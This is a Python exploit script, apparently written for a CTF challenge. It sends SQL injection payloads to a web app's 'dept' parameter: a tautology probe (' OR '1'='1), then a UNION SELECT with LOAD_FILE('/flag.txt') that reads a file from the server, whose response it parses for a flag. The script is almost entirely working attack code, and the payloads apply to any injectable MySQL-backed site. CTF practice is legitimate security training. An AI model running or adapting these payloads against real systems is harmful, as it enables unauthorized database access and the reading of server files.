#!/usr/bin/env python3
"""
SQL Injection exploit for CTF challenge
Target: http://172.18.0.2
"""

import requests
from urllib.parse import quote
from bs4 import BeautifulSoup
import re

# Target URL
BASE_URL = "http://host3.dreamhack.games:19680"

def exploit_sqli():
    """Exploit SQL Injection to extract flag from /flag.txt"""

    print("[*] Starting SQL Injection exploit...")
    print(f"[*] Target: {BASE_URL}")

    # Payload to read /flag.txt using LOAD_FILE()
    payload = "' UNION SELECT 1, 2, LOAD_FILE('/flag.txt') -- "

    # URL encode the payload
    encoded_payload = quote(payload)

    # Construct the full URL
    url = f"{BASE_URL}/?dept={encoded_payload}"

    print(f"[*] Payload: {payload}")
    print(f"[*] Sending request...")

    try:
        response = requests.get(url, timeout=10)

        if response.status_code == 200:
            print(f"[+] Response received (Status: {response.status_code})")

            # Parse HTML with BeautifulSoup
            soup = BeautifulSoup(response.text, 'html.parser')

            # Find all department cards
            dept_cards = soup.find_all('a', class_='dept-card')

            if dept_cards:
                print(f"[+] Found {len(dept_cards)} department card(s)")

                for card in dept_cards:
                    # Get department name (which should contain the flag)
                    dept_title = card.find('h3', class_='dept-card__title')
                    dept_meta = card.find('div', class_='dept-card__meta')

                    if dept_title:
                        dept_name = dept_title.get_text(strip=True)
                        university = dept_meta.get_text(strip=True) if dept_meta else "N/A"

                        print(f"\n[*] Department: {dept_name}")
                        print(f"[*] University: {university}")

                        # Check if this contains the flag
                        if "KOS_CTF{" in dept_name or "FLAG{" in dept_name or "flag{" in dept_name:
                            print("\n" + "="*60)
                            print(f"[+] FLAG FOUND: {dept_name}")
                            print("="*60 + "\n")
                            return dept_name

            # If no flag in cards, check entire page
            if "KOS_CTF{" in response.text or "FLAG{" in response.text:
                flags = re.findall(r'[A-Za-z_]+\{[^}]+\}', response.text)
                if flags:
                    print("\n" + "="*60)
                    print(f"[+] FLAG FOUND: {flags[0]}")
                    print("="*60 + "\n")
                    return flags[0]

            print("[-] Flag not found in response")
            print("[*] Response preview:")
            print(response.text[:500])

        else:
            print(f"[-] Request failed with status code: {response.status_code}")

    except requests.exceptions.RequestException as e:
        print(f"[-] Request failed: {e}")
        return None

def test_basic_sqli():
    """Test basic SQL injection to verify vulnerability"""
    print("\n[*] Testing basic SQL injection...")

    # Test payload: should return results
    test_payload = "' OR '1'='1"
    url = f"{BASE_URL}/?dept={quote(test_payload)}"

    try:
        response = requests.get(url, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        dept_cards = soup.find_all('a', class_='dept-card')

        if dept_cards:
            print(f"[+] SQL Injection vulnerability confirmed! Found {len(dept_cards)} results")
            return True
        else:
            print("[-] Vulnerability test inconclusive")
            return False
    except Exception as e:
        print(f"[-] Connection failed: {e}")
        return False

if __name__ == "__main__":
    print("="*60)
    print("CTF SQL Injection Exploit")
    print("="*60)

    # First test if injection works
    if test_basic_sqli():
        # Then exploit to get flag
        exploit_sqli()
    else:
        print("\n[-] Proceeding with exploit anyway...")
        exploit_sqli()
